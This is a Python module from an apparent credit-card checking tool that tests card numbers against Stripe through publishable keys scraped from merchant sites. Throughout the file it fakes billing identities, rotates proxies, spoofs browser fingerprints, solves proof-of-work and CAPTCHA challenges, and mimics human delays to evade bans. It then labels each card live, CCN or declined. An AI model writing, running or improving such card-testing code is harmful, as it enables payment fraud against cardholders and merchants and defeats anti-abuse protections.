import re
import json
import random
import string
import time
import uuid
import hashlib
import threading
import warnings
import requests
import requests.adapters
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from config import logger, fake, get_random_ua, get_proxy_dict
from captcha_solver import auto_solve_page, CAPTCHA_TYPES
from human_behavior import (reading_delay, typing_delay, page_interaction_delay,
                            pre_submit_delay, retry_delay)

warnings.filterwarnings('ignore', category=InsecureRequestWarning)

SEC_CH_UA_OPTIONS = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="24"',
    '"Chromium";v="126", "Google Chrome";v="126", "Not/A)Brand";v="8"',
    '"Chromium";v="127", "Google Chrome";v="127", "Not)A;Brand";v="99"',
    '"Chromium";v="128", "Microsoft Edge";v="128", "Not;A=Brand";v="8"',
    '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="8"',
    '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="24"',
    '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    '"Chromium";v="137", "Not/A)Brand";v="24"',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en-CA,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
    'en-AU,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.8',
]

STRIPE_VERSIONS = [
    'a7b74c0b44', 'b8c85d1e55', 'c9d96e2f66', 'd0e07f3a77',
    'e1f18a4b88', 'f2a29b5c99', 'a3b3ac6daa', 'b4c4bd7ebb',
]

BILLING_DATA = {
    "US": [
        {"city": "New York", "state": "New York", "zip": "10001", "country": "US"},
        {"city": "Los Angeles", "state": "California", "zip": "90001", "country": "US"},
        {"city": "Chicago", "state": "Illinois", "zip": "60601", "country": "US"},
        {"city": "Houston", "state": "Texas", "zip": "77001", "country": "US"},
        {"city": "Phoenix", "state": "Arizona", "zip": "85001", "country": "US"},
        {"city": "Seattle", "state": "Washington", "zip": "98101", "country": "US"},
        {"city": "Denver", "state": "Colorado", "zip": "80201", "country": "US"},
        {"city": "Austin", "state": "Texas", "zip": "73301", "country": "US"},
    ],
    "GB": [
        {"city": "London", "state": "England", "zip": "EC1A 1BB", "country": "GB"},
        {"city": "Manchester", "state": "England", "zip": "M1 1AE", "country": "GB"},
        {"city": "Birmingham", "state": "England", "zip": "B1 1BB", "country": "GB"},
    ],
    "CA": [
        {"city": "Toronto", "state": "Ontario", "zip": "M5H 2N2", "country": "CA"},
        {"city": "Vancouver", "state": "British Columbia", "zip": "V6B 1A1", "country": "CA"},
        {"city": "Montreal", "state": "Quebec", "zip": "H2X 1Y4", "country": "CA"},
    ],
    "AU": [
        {"city": "Sydney", "state": "New South Wales", "zip": "2000", "country": "AU"},
        {"city": "Melbourne", "state": "Victoria", "zip": "3000", "country": "AU"},
    ],
    "DE": [
        {"city": "Berlin", "state": "Berlin", "zip": "10115", "country": "DE"},
        {"city": "Munich", "state": "Bavaria", "zip": "80331", "country": "DE"},
    ],
}

BAN_SIGNALS = [
    "rate_limit", "too many requests", "rate limit exceeded",
    "api rate limit", "request rate too high", "temporarily blocked",
    "access denied", "ip blocked", "ip banned",
    "please try again later", "service temporarily unavailable",
]

REFRESH_ERRORS = [
    "refresh the page", "refresh and try again",
    "not able to process this request", "nonce verification failed",
    "session expired", "invalid nonce", "nonce is invalid",
    "are you sure you want to do this",
]

CCN_KEYWORDS = [
    "incorrect_cvc", "cvc_check: fail", "invalid_cvc", "cvv_decline",
    "security code is incorrect", "cvc mismatch", "wrong_cvc",
    "cvc does not match", "cvc_failure", "your card's security code is incorrect",
    "the cvc code is incorrect", "security code incorrect",
]

LIVE_KEYWORDS = [
    "succeeded", "requires_action", "payment_method.attached",
    "setup_intent.succeeded", "payment_method_saved", "card_verified",
    "payment_method.created", "card_tokenized", "verified_card",
    "cvv_passed", "cvc_check: pass", "card_live",
    "payment method saved", "card successfully added",
    "card has been verified", "payment method added successfully",
]


class RateLimiter:
    def __init__(self, max_requests=20, window=60, ban_threshold=3, ban_cooldown=120):
        self._lock = threading.Lock()
        self._requests = []
        self._max_requests = max_requests
        self._window = window
        self._ban_count = 0
        self._ban_threshold = ban_threshold
        self._ban_cooldown = ban_cooldown
        self._banned_until = 0
        self._backoff_level = 0
        self._total_rate_limits = 0
        self._total_bans = 0

    def wait_if_needed(self):
        with self._lock:
            now = time.time()
            if now < self._banned_until:
                wait = self._banned_until - now
                logger.warning(f"Rate limiter: banned, sleeping {wait:.0f}s")
                time.sleep(wait)

            now = time.time()
            self._requests = [t for t in self._requests if now - t < self._window]
            if len(self._requests) >= self._max_requests:
                oldest = self._requests[0]
                wait = self._window - (now - oldest) + random.uniform(0.3, 1.0)
                logger.warning(f"Rate limit: {len(self._requests)}/{self._max_requests} - waiting {wait:.1f}s")
                time.sleep(wait)

            if self._backoff_level > 0:
                bd = min(self._backoff_level * 1, 15) + random.uniform(0.2, 0.8)
                time.sleep(bd)

            self._requests.append(time.time())

    def record_rate_limit(self):
        with self._lock:
            self._ban_count += 1
            self._total_rate_limits += 1
            self._backoff_level = min(self._backoff_level + 1, 10)
            if self._ban_count >= self._ban_threshold:
                self._total_bans += 1
                self._banned_until = time.time() + self._ban_cooldown
                self._ban_count = 0
                logger.warning(f"BAN #{self._total_bans} - cooldown {self._ban_cooldown}s")

    def record_success(self):
        with self._lock:
            self._ban_count = max(0, self._ban_count - 1)
            self._backoff_level = max(0, self._backoff_level - 1)

    def record_ban(self, duration=None):
        with self._lock:
            self._total_bans += 1
            cooldown = duration or self._ban_cooldown * 2
            self._banned_until = time.time() + cooldown
            self._backoff_level = min(self._backoff_level + 3, 10)

    def get_stats(self):
        with self._lock:
            return {
                'rate_limits': self._total_rate_limits,
                'bans': self._total_bans,
                'backoff_level': self._backoff_level,
                'is_banned': time.time() < self._banned_until,
            }


_auth_rate_limiter = RateLimiter(max_requests=15, window=60, ban_threshold=3, ban_cooldown=120)
_intent_rate_limiter = RateLimiter(max_requests=15, window=60, ban_threshold=3, ban_cooldown=120)


def get_auth_rate_limiter():
    return _auth_rate_limiter


def get_intent_rate_limiter():
    return _intent_rate_limiter


def is_ban_signal(text):
    t = text.lower()
    return any(sig in t for sig in BAN_SIGNALS)


def is_refresh_error(msg):
    m = msg.lower()
    return any(err in m for err in REFRESH_ERRORS)


def get_billing(country_code="US"):
    cc = country_code.upper()
    options = BILLING_DATA.get(cc, BILLING_DATA["US"])
    return random.choice(options)


def generate_fingerprint():
    base = uuid.uuid4().hex
    return {
        'guid': f"{base[:8]}-{base[8:12]}-{base[12:16]}-{base[16:20]}-{base[20:32]}",
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
    }


def rnd_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    return f"{name}{random.randint(10,9999)}@{random.choice(domains)}"


def make_session(use_proxy=True):
    ua = get_random_ua()
    s = requests.Session()

    retry_strategy = Retry(total=2, backoff_factor=1)
    adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.max_redirects = 10

    platform = random.choice(['"Windows"', '"macOS"', '"Linux"'])
    mobile = '?0'

    s.headers.update({
        'user-agent': ua,
        'sec-ch-ua': random.choice(SEC_CH_UA_OPTIONS),
        'sec-ch-ua-mobile': mobile,
        'sec-ch-ua-platform': platform,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': random.choice(ACCEPT_LANGUAGES),
    })

    s.__dict__['_ua'] = ua
    s.__dict__['_fingerprint'] = generate_fingerprint()
    s.__dict__['_proxy_used'] = None

    if use_proxy:
        try:
            proxy_dict = get_proxy_dict()
            if proxy_dict:
                s.proxies = proxy_dict
                s.__dict__['_proxy_used'] = list(proxy_dict.values())[0].replace('http://', '').replace('https://', '')
        except Exception:
            pass

    return s


def solve_pow(html, s, page_url):
    ts_match = re.search(r'target\+"\|(\d+)\|"', html)
    zeros_match = re.search(r'const zeros\s*=\s*"(0+)"', html)
    sig_match = re.search(r'const sig\s*=\s*"([a-f0-9]+)"', html)

    if not ts_match or not zeros_match:
        return None

    timestamp = ts_match.group(1)
    zeros = zeros_match.group(1)
    sig = sig_match.group(1) if sig_match else ""

    logger.info(f"PoW challenge: difficulty={len(zeros)}")

    ua = s.__dict__.get('_ua', get_random_ua())
    nonce = 0
    max_attempts = 2000000
    while nonce < max_attempts:
        challenge = f"{ua}|{timestamp}|{nonce}"
        h = hashlib.sha256(challenge.encode()).hexdigest()
        if h.startswith(zeros):
            logger.info("PoW solved")
            break
        nonce += 1
    else:
        logger.warning("PoW failed: max attempts reached")
        return None

    post_data = {
        'pow_nonce': str(nonce),
        'pow_sig': sig,
        'pow_ts': timestamp,
        'pow_ver': 'v3',
    }
    try:
        r = s.post(page_url, data=post_data, verify=False, timeout=20, allow_redirects=True)
        return r.text
    except Exception:
        logger.error("PoW submit failed")
        return None


def handle_captcha(s, page_html, page_url):
    proxy_addr = s.__dict__.get('_proxy_used')
    captcha_result = auto_solve_page(
        html=page_html,
        page_url=page_url,
        proxy=proxy_addr,
        session=s,
    )
    if captcha_result.get("needed"):
        ctype_label = CAPTCHA_TYPES.get(captcha_result.get("captcha_type", ""), "CAPTCHA")
        if captcha_result["solved"]:
            logger.info(f"CAPTCHA auto-solved: {ctype_label} via {captcha_result.get('provider','auto')} in {captcha_result.get('time', 0):.1f}s")
            cleared = captcha_result.get("cleared_html")
            if cleared:
                page_html = cleared
            if captcha_result.get("user_agent"):
                s.headers['user-agent'] = captcha_result["user_agent"]
            return page_html, True
        else:
            logger.warning(f"CAPTCHA detected ({ctype_label}) but not solved: {captcha_result.get('error','')}")
            return page_html, False
    return page_html, True


def handle_pow_and_captcha(s, page_html, page_url):
    if 'pow_nonce' in page_html or 'Verifying' in page_html or 'not a bot' in page_html:
        solved_html = solve_pow(page_html, s, page_url)
        if solved_html:
            page_html = solved_html
        else:
            return None, "Failed to solve site challenge"

    page_html, captcha_ok = handle_captcha(s, page_html, page_url)
    if not captcha_ok:
        return None, "CAPTCHA detected - solver needed"

    return page_html, None


def extract_stripe_key(html):
    pk_patterns = [
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'"stripe_publishable_key":"(pk_live_[^"]+)"',
        r'"key":"(pk_live_[^"]+)"',
        r"'publishableKey':\s*'(pk_live_[^']+)'",
        r'data-publishable-key="(pk_live_[^"]+)"',
        r'Stripe\(["\']?(pk_live_[^"\']+)',
        r'"pk_live_([A-Za-z0-9]+)"',
    ]
    for pat in pk_patterns:
        m = re.search(pat, html)
        if m:
            key = m.group(1)
            if not key.startswith('pk_live_'):
                key = f"pk_live_{key}"
            return key
    return None


def tokenize_card(cc, mes, ano, cvv, pub_key, site_url, rate_limiter, country_code="US"):
    fp = generate_fingerprint()
    stripe_ver = random.choice(STRIPE_VERSIONS)
    billing = get_billing(country_code)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': get_random_ua(),
    }

    f_name = fake.first_name()
    l_name = fake.last_name()
    email = rnd_email()

    data = {
        'type': 'card',
        'billing_details[name]': f"{f_name} {l_name}",
        'billing_details[email]': email,
        'billing_details[address][city]': billing['city'],
        'billing_details[address][country]': billing['country'],
        'billing_details[address][line1]': fake.street_address(),
        'billing_details[address][postal_code]': billing['zip'],
        'billing_details[address][state]': billing['state'],
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': fp['guid'],
        'muid': fp['muid'],
        'sid': fp['sid'],
        'payment_user_agent': f'stripe.js/{stripe_ver}; stripe-js-v3/{stripe_ver}; card-element',
        'key': pub_key,
    }

    try:
        rate_limiter.wait_if_needed()
        typing_delay(len(cc))
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20, verify=False)

        if r.status_code == 429:
            rate_limiter.record_rate_limit()
            return None, {"message": "Stripe API rate limited"}, "N/A"
        elif r.status_code == 403:
            rate_limiter.record_ban()
            return None, {"message": "Stripe API blocked"}, "N/A"

        js = r.json()
        pm_id = js.get('id')
        card_brand = (js.get('card', {}).get('brand') or 'N/A').upper()

        if pm_id:
            rate_limiter.record_success()
            return pm_id, None, card_brand
        else:
            err = js.get('error', {})
            err_msg = err.get('message', '')
            if is_ban_signal(err_msg):
                rate_limiter.record_rate_limit()
            return None, err, card_brand

    except Exception as e:
        logger.error(f"Tokenization error: {str(e)[:60]}")
        return None, {"message": str(e)}, "N/A"


DECLINE_MAP = {
    "insufficient_funds": ("ccn", "Insufficient Funds (Live)"),
    "insufficient funds": ("ccn", "Insufficient Funds (Live)"),
    "not_sufficient_funds": ("ccn", "Insufficient Funds (Live)"),
    "authentication_required": ("live", "3DS Required (Card Live)"),
    "requires_action": ("live", "3DS Required (Card Live)"),
    "approve_with_id": ("live", "Approved with ID (Live)"),
    "card_velocity_exceeded": ("live", "Activity Limit (Live)"),
    "withdrawal_count_limit_exceeded": ("live", "Limit Exceeded (Live)"),
    "incorrect_cvc": ("ccn", "CVV Declined (Card Live)"),
    "cvc_check_failed": ("ccn", "CVV Declined (Card Live)"),
    "security code is incorrect": ("ccn", "CVV Declined (Card Live)"),
    "incorrect_zip": ("live", "AVS Mismatch (Card Live)"),
    "stolen_card": ("declined", "Card Reported Stolen"),
    "lost_card": ("declined", "Card Reported Lost"),
    "fraudulent": ("declined", "Fraud Suspected"),
    "do_not_honor": ("declined", "Issuer/Cardholder Declined"),
    "do not honor": ("declined", "Issuer/Cardholder Declined"),
    "pickup_card": ("declined", "Pick Up Card"),
    "restricted_card": ("declined", "Restricted Card"),
    "processing_error": ("declined", "Processor Declined"),
    "generic_decline": ("declined", "Card Declined"),
    "card_declined": ("declined", "Card Declined"),
    "expired_card": ("declined", "Expired Card"),
    "incorrect_number": ("declined", "Invalid Card Number"),
    "your card number is incorrect": ("declined", "Invalid Card Number"),
    "invalid_expiry": ("declined", "Invalid Expiry"),
    "security_violation": ("declined", "Security Violation"),
    "issuer_not_available": ("declined", "Call Issuer"),
    "call_issuer": ("declined", "Call Issuer"),
    "try_again_later": ("declined", "Try Again Later"),
    "not_permitted": ("declined", "Transaction Not Allowed"),
    "transaction_not_allowed": ("declined", "Transaction Not Allowed"),
    "service_not_allowed": ("declined", "Transaction Not Allowed"),
    "currency_not_supported": ("declined", "Currency Not Supported"),
    "invalid_account": ("declined", "Invalid Card Number"),
    "new_account_information_available": ("declined", "Updated Card Available"),
    "reenter_transaction": ("declined", "Processor Declined"),
    "no_action_taken": ("declined", "Card Declined"),
    "testmode_decline": ("declined", "Test Mode Decline"),
    "live_mode_test_card": ("declined", "Test Card Rejected"),
    "revocation_of_authorization": ("declined", "Revoked Authorization"),
    "revocation_of_all_authorizations": ("declined", "Revoked Authorization"),
    "invalid_amount": ("declined", "Invalid Amount"),
}


def parse_token_error(err):
    if isinstance(err, str):
        return "error", err
    if not err:
        return "error", "Tokenization Failed"

    msg = err.get('message', 'Unknown error')
    code = err.get('code', '')
    decline_code = err.get('decline_code', '')

    full_msg = msg
    if decline_code:
        full_msg = f"{msg} [{decline_code}]"
    elif code:
        full_msg = f"{msg} [{code}]"

    check = f"{code} {decline_code} {msg}".lower()

    for kw in CCN_KEYWORDS:
        if kw.lower() in check:
            return "ccn", f"CCN Live - {full_msg}"

    for pattern, (status, detail) in DECLINE_MAP.items():
        if pattern in check:
            return status, detail

    if 'declined' in check:
        return "declined", full_msg
    if 'invalid' in check:
        return "declined", full_msg
    if 'expired' in check:
        return "declined", "Expired Card"

    return "declined", full_msg


def classify_response(res):
    raw_text = json.dumps(res).lower()

    if res.get("status") == "succeeded":
        return "live", "Succeeded"

    err = res.get("error", {})
    if isinstance(err, dict):
        s_code = err.get("code", "")
        s_decline = err.get("decline_code", "")
        s_msg = err.get("message", "")
        combined = f"{s_code} {s_decline} {s_msg}".lower()

        for kw in CCN_KEYWORDS:
            if kw.lower() in combined:
                return "ccn", f"CCN Live - {s_msg}"

        for pattern, (status, detail) in DECLINE_MAP.items():
            if pattern in combined:
                return status, detail

    for kw in LIVE_KEYWORDS:
        if kw.lower() in raw_text:
            return "live", f"Live ({kw})"

    for kw in CCN_KEYWORDS:
        if kw.lower() in raw_text:
            msg = err.get("message", kw) if isinstance(err, dict) else kw
            return "ccn", f"CCN Live - {msg}"

    if isinstance(err, dict):
        decline_code = err.get("decline_code", "")
        message = err.get("message", "Declined")
        if decline_code:
            return "declined", f"{message} [{decline_code}]"
        return "declined", message

    return "declined", "Declined"


def classify_setup_response(resp_text):
    resp_lower = resp_text.lower()

    if '"status":"succeeded"' in resp_lower or '"status":"success"' in resp_lower:
        return "live", "Setup Intent Succeeded"

    if '"requires_action"' in resp_lower or 'requires_action' in resp_lower:
        return "live", "3DS Required (Card Live)"

    for kw in CCN_KEYWORDS:
        if kw.lower() in resp_lower:
            return "ccn", f"CCN Live (CVV wrong) - {kw}"

    try:
        js = json.loads(resp_text)
        if js.get("status") == "succeeded" or js.get("success") is True:
            return "live", "Setup Succeeded"

        err = js.get("error", {})
        if isinstance(err, dict):
            s_code = err.get("code", "")
            s_decline = err.get("decline_code", "")
            s_msg = err.get("message", "")
            combined = f"{s_code} {s_decline} {s_msg}".lower()

            for pattern, (status, detail) in DECLINE_MAP.items():
                if pattern in combined:
                    return status, detail

            if s_msg:
                return "declined", f"{s_msg} [{s_decline}]" if s_decline else s_msg
    except (json.JSONDecodeError, Exception):
        pass

    for pattern, (status, detail) in DECLINE_MAP.items():
        if pattern in resp_lower:
            return status, detail

    if 'your card was declined' in resp_lower:
        return "declined", "Your card was declined"
    if 'declined' in resp_lower:
        return "declined", resp_text[:100]

    return "declined", resp_text[:120] if resp_text else "Unknown response"


def error_result(cc, mes, ano, cvv, detail, gate_name="Stripe"):
    return {
        "status": "error",
        "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "brand": "N/A",
        "detail": detail,
        "gate": gate_name,
        "result": f"Error - {cc}|{mes}|{ano}|{cvv} | {detail}",
    }


def format_result(status, cc, mes, ano, cvv, detail, gate_name, card_brand="N/A", proxy_used=None):
    if status in ("live", "charged", "ccn"):
        label = "CCN" if status == "ccn" else ("Charged" if status == "charged" else "Approved")
    else:
        label = "Declined"

    result = {
        "status": status,
        "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "brand": card_brand,
        "detail": detail,
        "gate": gate_name,
        "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}",
    }
    if proxy_used:
        result["proxy_used"] = proxy_used
    return result


def gets(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except (IndexError, ValueError):
        return None
